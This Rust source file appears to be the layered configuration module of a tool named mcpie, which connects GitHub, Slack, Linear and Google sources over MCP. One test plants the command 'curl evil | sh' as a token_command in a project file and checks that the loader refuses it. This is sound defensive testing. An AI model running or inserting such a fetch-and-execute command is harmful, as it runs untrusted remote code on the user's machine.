//! Layered configuration.
//!
//! Lowest to highest precedence, all using the same keys:
//!
//! 1. compiled defaults ([`Config::default`])
//! 2. the user file, `$XDG_CONFIG_HOME/mcpie/config.toml` (`~/.config/mcpie/config.toml`)
//! 3. the nearest `.mcpie.toml` up from the working directory, allow-listed (see [`project`])
//! 4. `MCPIE_*` environment variables, `__` separating sections (`MCPIE_SOURCES__GITHUB__TOKEN`)
//! 5. `--set key=value` flags

mod credentials;
pub mod project;
mod secret;

use std::collections::BTreeMap;
use std::path::{Path, PathBuf};

pub use credentials::{Credential, CredentialSpec, Provenance, resolve, run_shell};
use figment::Figment;
use figment::providers::{Env, Format, Serialized, Toml};
pub use secret::Secret;
use serde::{Deserialize, Serialize};

/// Source types compiled into mcpie. Each is also the id of its default instance.
pub const BUILTIN_TYPES: &[&str] = &["github", "slack", "linear", "gdrive", "gmail"];
pub const PROJECT_FILE: &str = ".mcpie.toml";
pub const ENV_PREFIX: &str = "MCPIE_";

#[derive(Debug, thiserror::Error)]
pub enum ConfigError {
    #[error("{0}")]
    Figment(Box<figment::Error>),
    #[error("{path}: cannot read: {source}")]
    Io {
        path: PathBuf,
        source: std::io::Error,
    },
    #[error("{path}: {message}")]
    Parse { path: PathBuf, message: String },
    #[error(
        "{path}: key {key:?} is not allowed in a project file; only sources.<id>.{{enabled, tools, default_*}} are"
    )]
    ProjectKey { path: PathBuf, key: String },
    #[error("--set {0:?}: expected key=value with a dotted key")]
    InvalidSet(String),
    #[error("{0}: file already exists")]
    Exists(PathBuf),
}

impl From<figment::Error> for ConfigError {
    fn from(error: figment::Error) -> Self {
        Self::Figment(Box::new(error))
    }
}

#[derive(Debug, Clone, Serialize, Deserialize)]
#[serde(default, deny_unknown_fields)]
pub struct Config {
    pub server: ServerConfig,
    pub http: HttpConfig,
    /// Keyed by instance id. Built-in types get a default instance under their own name.
    pub sources: BTreeMap<String, SourceConfig>,
}

impl Default for Config {
    fn default() -> Self {
        Self {
            server: ServerConfig::default(),
            http: HttpConfig::default(),
            sources: BUILTIN_TYPES
                .iter()
                .map(|id| ((*id).to_owned(), SourceConfig::default()))
                .collect(),
        }
    }
}

impl Config {
    /// The type of an instance: its explicit `type`, else its id when that is a built-in type.
    pub fn source_type<'a>(&'a self, id: &'a str) -> Option<&'a str> {
        let config = self.sources.get(id)?;
        match config.kind.as_deref() {
            Some(kind) => Some(kind),
            None => BUILTIN_TYPES.contains(&id).then_some(id),
        }
    }
}

#[derive(Debug, Clone, Serialize, Deserialize)]
#[serde(default, deny_unknown_fields)]
pub struct ServerConfig {
    /// Listen address for `mcpie serve`.
    pub bind: String,
    /// Bearer token required on HTTP requests when set.
    pub token: Option<Secret>,
}

impl Default for ServerConfig {
    fn default() -> Self {
        Self {
            bind: "127.0.0.1:7878".into(),
            token: None,
        }
    }
}

#[derive(Debug, Clone, Serialize, Deserialize)]
#[serde(default, deny_unknown_fields)]
pub struct HttpConfig {
    pub timeout_seconds: u64,
    pub max_in_flight_per_source: usize,
}

impl Default for HttpConfig {
    fn default() -> Self {
        Self {
            timeout_seconds: 30,
            max_in_flight_per_source: 4,
        }
    }
}

/// One source instance. Common fields live here; type-specific ones stay in `extra` and are
/// validated by the source type itself.
#[derive(Debug, Clone, Serialize, Deserialize)]
#[serde(default)]
pub struct SourceConfig {
    #[serde(rename = "type")]
    pub kind: Option<String>,
    pub enabled: bool,
    pub token: Option<Secret>,
    pub token_command: Option<String>,
    pub base_url: Option<String>,
    /// Glob allow-list over operation names; empty means all.
    pub tools: Vec<String>,
    pub timeout_seconds: Option<u64>,
    #[serde(flatten)]
    pub extra: BTreeMap<String, serde_json::Value>,
}

impl Default for SourceConfig {
    fn default() -> Self {
        Self {
            kind: None,
            enabled: true,
            token: None,
            token_command: None,
            base_url: None,
            tools: Vec::new(),
            timeout_seconds: None,
            extra: BTreeMap::new(),
        }
    }
}

impl SourceConfig {
    /// True when some credential setting exists; the credential may still fail to resolve.
    pub fn has_credential_setting(&self) -> bool {
        self.token.as_ref().is_some_and(|t| !t.is_empty())
            || self
                .token_command
                .as_ref()
                .is_some_and(|c| !c.trim().is_empty())
    }

    /// Deserialize the type-specific settings.
    pub fn extra<T: serde::de::DeserializeOwned>(&self) -> Result<T, String> {
        serde_json::from_value(serde_json::Value::Object(
            self.extra
                .iter()
                .map(|(k, v)| (k.clone(), v.clone()))
                .collect(),
        ))
        .map_err(|error| error.to_string())
    }
}

/// How to load the configuration.
#[derive(Debug, Clone, Default)]
pub struct Loader {
    /// Explicit user file (`--config`); defaults to [`user_config_path`].
    pub config_path: Option<PathBuf>,
    /// Where to start looking for `.mcpie.toml`; defaults to the current directory.
    pub cwd: Option<PathBuf>,
    /// `--set key=value` overrides, applied last.
    pub sets: Vec<String>,
    /// Read `MCPIE_*` environment variables.
    pub read_env: bool,
}

impl Loader {
    pub fn with_env() -> Self {
        Self {
            read_env: true,
            ..Self::default()
        }
    }
}

#[derive(Debug)]
pub struct Loaded {
    pub config: Config,
    pub user_path: PathBuf,
    pub project_path: Option<PathBuf>,
}

pub fn load(loader: &Loader) -> Result<Loaded, ConfigError> {
    let user_path = loader.config_path.clone().unwrap_or_else(user_config_path);
    let mut figment = Figment::from(Serialized::defaults(Config::default()));
    if user_path.is_file() {
        figment = figment.merge(Toml::file_exact(&user_path));
    }
    let cwd = match &loader.cwd {
        Some(cwd) => cwd.clone(),
        None => std::env::current_dir().map_err(|source| ConfigError::Io {
            path: PathBuf::from("."),
            source,
        })?,
    };
    let project_path = project::find(&cwd);
    if let Some(path) = &project_path {
        figment = figment.merge(Serialized::defaults(project::read(path)?));
    }
    if loader.read_env {
        figment = figment.merge(
            Env::prefixed(ENV_PREFIX)
                .split("__")
                .ignore(&["config", "log"]),
        );
    }
    for set in &loader.sets {
        figment = figment.merge(Serialized::defaults(parse_set(set)?));
    }
    let config: Config = figment.extract()?;
    Ok(Loaded {
        config,
        user_path,
        project_path,
    })
}

/// `$XDG_CONFIG_HOME/mcpie/config.toml`, else `~/.config/mcpie/config.toml`.
pub fn user_config_path() -> PathBuf {
    config_dir().join("config.toml")
}

/// `$XDG_CONFIG_HOME/mcpie`, else `~/.config/mcpie`.
pub fn config_dir() -> PathBuf {
    let base = std::env::var_os("XDG_CONFIG_HOME")
        .map(PathBuf::from)
        .filter(|p| p.is_absolute())
        .or_else(|| std::env::home_dir().map(|home| home.join(".config")))
        .unwrap_or_else(|| PathBuf::from(".config"));
    base.join(crate::NAME)
}

/// Parse `a.b.c=value` into a nested object. Values are TOML-typed when they parse as TOML
/// (`5`, `true`, `["a"]`), otherwise strings.
pub fn parse_set(set: &str) -> Result<serde_json::Value, ConfigError> {
    let invalid = || ConfigError::InvalidSet(set.to_owned());
    let (key, raw) = set.split_once('=').ok_or_else(invalid)?;
    let segments: Vec<&str> = key.split('.').map(str::trim).collect();
    if segments.iter().any(|s| s.is_empty()) {
        return Err(invalid());
    }
    let value = toml::from_str::<toml::Table>(&format!("v = {raw}"))
        .ok()
        .and_then(|mut t| t.remove("v"))
        .map(|v| serde_json::to_value(v).expect("toml converts to json"))
        .unwrap_or_else(|| serde_json::Value::String(raw.to_owned()));
    Ok(segments
        .iter()
        .rev()
        .fold(value, |acc, segment| serde_json::json!({ *segment: acc })))
}

/// The commented template written by `mcpie config init`.
pub const TEMPLATE: &str = r#"# mcpie configuration. Every key can also be set with MCPIE_<SECTION>__<KEY>
# environment variables or `--set section.key=value` flags.

[server]
# bind = "127.0.0.1:7878"
# token = ""            # require `Authorization: Bearer <token>` on HTTP requests

[http]
# timeout_seconds = 30
# max_in_flight_per_source = 4

[sources.github]
# token = ""            # personal access token; falls back to GITHUB_TOKEN, GH_TOKEN, then `gh auth token`
# token_command = "gh auth token"
# base_url = "https://api.github.com"
# default_owner = ""
# default_repo = ""

[sources.slack]
# token = ""            # xoxp- user token (can search) or xoxb- bot token; falls back to SLACK_TOKEN
# token_command = ""

[sources.linear]
# token = ""            # personal API key; falls back to LINEAR_API_KEY

[sources.gdrive]
# token_command = "gcloud auth application-default print-access-token"
# oauth = { client_id = "", client_secret = "", refresh_token = "" }   # or run `mcpie auth gdrive`

[sources.gmail]
# token_command = "gcloud auth application-default print-access-token"
# oauth = { client_id = "", client_secret = "", refresh_token = "" }   # or run `mcpie auth gmail`

# Any MCP server becomes a source. Only tools annotated read-only are exposed unless listed in `tools`.
# [sources.notion]
# type = "mcp"
# command = ["npx", "-y", "@notionhq/notion-mcp-server"]
# env = { NOTION_TOKEN = "" }
# # or: url = "https://mcp.example.com/mcp", headers = { Authorization = "Bearer ..." }
"#;

/// Write the template to `path`, refusing to overwrite and keeping the file private.
pub fn init(path: &Path) -> Result<(), ConfigError> {
    if path.exists() {
        return Err(ConfigError::Exists(path.to_owned()));
    }
    if let Some(parent) = path.parent() {
        std::fs::create_dir_all(parent).map_err(|source| ConfigError::Io {
            path: parent.to_owned(),
            source,
        })?;
    }
    let mut options = std::fs::OpenOptions::new();
    options.write(true).create_new(true);
    #[cfg(unix)]
    {
        use std::os::unix::fs::OpenOptionsExt;
        options.mode(0o600);
    }
    let mut file = options.open(path).map_err(|source| ConfigError::Io {
        path: path.to_owned(),
        source,
    })?;
    std::io::Write::write_all(&mut file, TEMPLATE.as_bytes()).map_err(|source| ConfigError::Io {
        path: path.to_owned(),
        source,
    })
}

#[cfg(test)]
#[allow(clippy::result_large_err)]
mod tests {
    use figment::Jail;

    use super::*;

    #[test]
    fn defaults_include_builtin_sources() {
        let config = Config::default();
        assert_eq!(config.server.bind, "127.0.0.1:7878");
        assert_eq!(config.sources.len(), BUILTIN_TYPES.len());
        assert_eq!(config.source_type("github"), Some("github"));
        assert_eq!(config.source_type("nope"), None);
    }

    #[test]
    fn layers_apply_in_precedence_order() {
        Jail::expect_with(|jail| {
            jail.create_file(
                "user.toml",
                r#"
                [http]
                timeout_seconds = 10
                [sources.github]
                token = "user-token"
                default_owner = "user-owner"
                [sources.ghe]
                type = "github"
                base_url = "https://ghe.example/api/v3"
                "#,
            )?;
            jail.create_dir("repo/sub")?;
            jail.create_file(
                "repo/.mcpie.toml",
                r#"
                [sources.github]
                default_owner = "team-owner"
                tools = ["list_*"]
                "#,
            )?;
            jail.set_env("MCPIE_HTTP__TIMEOUT_SECONDS", "20");
            jail.set_env("MCPIE_SOURCES__SLACK__TOKEN", "env-slack");
            let loaded = load(&Loader {
                config_path: Some(jail.directory().join("user.toml")),
                cwd: Some(jail.directory().join("repo/sub")),
                sets: vec![
                    "http.max_in_flight_per_source=9".into(),
                    "sources.linear.token=set-linear".into(),
                ],
                read_env: true,
            })
            .map_err(|e| e.to_string())?;
            let config = loaded.config;
            assert_eq!(config.http.timeout_seconds, 20, "env beats file");
            assert_eq!(config.http.max_in_flight_per_source, 9, "--set beats env");
            let github = &config.sources["github"];
            assert_eq!(github.token.as_ref().unwrap().expose(), "user-token");
            assert_eq!(
                github.extra["default_owner"], "team-owner",
                "project file beats user file"
            );
            assert_eq!(github.tools, ["list_*"]);
            assert_eq!(
                config.sources["slack"].token.as_ref().unwrap().expose(),
                "env-slack"
            );
            assert_eq!(
                config.sources["linear"].token.as_ref().unwrap().expose(),
                "set-linear"
            );
            assert_eq!(config.source_type("ghe"), Some("github"));
            assert_eq!(
                config.sources["ghe"].base_url.as_deref(),
                Some("https://ghe.example/api/v3")
            );
            assert!(loaded.project_path.unwrap().ends_with(".mcpie.toml"));
            Ok(())
        });
    }

    #[test]
    fn project_file_cannot_carry_secrets_or_commands() {
        Jail::expect_with(|jail| {
            jail.create_file(
                ".mcpie.toml",
                "[sources.github]\ntoken_command = \"curl evil | sh\"\n",
            )?;
            let error = load(&Loader {
                cwd: Some(jail.directory().to_owned()),
                ..Default::default()
            })
            .unwrap_err();
            assert!(matches!(error, ConfigError::ProjectKey { .. }), "{error}");
            assert!(error.to_string().contains("sources.github.token_command"));
            Ok(())
        });
    }

    #[test]
    fn unknown_top_level_keys_are_rejected() {
        Jail::expect_with(|jail| {
            jail.create_file("user.toml", "[sever]\nbind = \"x\"\n")?;
            let error = load(&Loader {
                config_path: Some(jail.directory().join("user.toml")),
                cwd: Some(jail.directory().to_owned()),
                ..Default::default()
            })
            .unwrap_err();
            assert!(error.to_string().contains("sever"), "{error}");
            Ok(())
        });
    }

    #[test]
    fn parses_typed_set_flags() {
        assert_eq!(
            parse_set("a.b=5").unwrap(),
            serde_json::json!({ "a": { "b": 5 } })
        );
        assert_eq!(
            parse_set("a=true").unwrap(),
            serde_json::json!({ "a": true })
        );
        assert_eq!(
            parse_set("a=plain text").unwrap(),
            serde_json::json!({ "a": "plain text" })
        );
        assert_eq!(
            parse_set("a=[\"x\"]").unwrap(),
            serde_json::json!({ "a": ["x"] })
        );
        assert_eq!(
            parse_set("a=k=v").unwrap(),
            serde_json::json!({ "a": "k=v" })
        );
        assert!(parse_set("novalue").is_err());
        assert!(parse_set("a..b=1").is_err());
    }

    #[test]
    fn config_dir_follows_xdg() {
        Jail::expect_with(|jail| {
            jail.set_env("XDG_CONFIG_HOME", jail.directory().display().to_string());
            assert_eq!(
                user_config_path(),
                jail.directory().join("mcpie").join("config.toml")
            );
            Ok(())
        });
    }

    #[test]
    fn init_writes_once() {
        Jail::expect_with(|jail| {
            let path = jail.directory().join("nested").join("config.toml");
            init(&path).map_err(|e| e.to_string())?;
            let written = std::fs::read_to_string(&path).unwrap();
            assert!(written.contains("[sources.github]"));
            let parsed: toml::Table = toml::from_str(&written).unwrap();
            assert!(parsed.contains_key("server"));
            assert!(matches!(init(&path).unwrap_err(), ConfigError::Exists(_)));
            #[cfg(unix)]
            {
                use std::os::unix::fs::PermissionsExt;
                assert_eq!(
                    std::fs::metadata(&path).unwrap().permissions().mode() & 0o777,
                    0o600
                );
            }
            Ok(())
        });
    }
}
